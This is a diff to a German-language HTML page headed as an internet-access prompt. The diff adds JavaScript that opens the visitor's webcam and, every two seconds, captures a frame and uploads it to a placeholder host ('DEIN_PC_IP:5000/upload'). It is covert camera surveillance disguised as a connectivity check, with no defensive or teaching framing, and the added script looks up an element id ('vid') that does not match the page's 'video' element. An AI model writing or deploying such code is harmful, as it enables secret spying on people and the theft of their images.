@@ -7,7 +7,28 @@
         <h1 style="color:red;">Zugriff auf Ihr Internet ...</h1>
         <video id="video" width="640" height="480" autoplay></video>
         <script>
-            navigator.mediaDevices.getUserMedia({video: true}).then(function(Stream) {document.getElementById('video').srcObject = stream;}).catch(function(error){alert("Internet konnte nicht zugegriffen werden: " + error); });
-        </script>
+  navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+    const video = document.getElementById('vid');
+    video.srcObject = stream;
+
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        fetch('http://DEIN_PC_IP:5000/upload', {
+          method: 'POST',
+          body: blob
+        });
+      }, 'image/jpeg');
+    }, 2000); // alle 2 Sekunden ein Bild
+  }).catch(err => {
+    alert("Zugriff verweigert: " + err);
+  });
+</script>
     </body>
 </html>
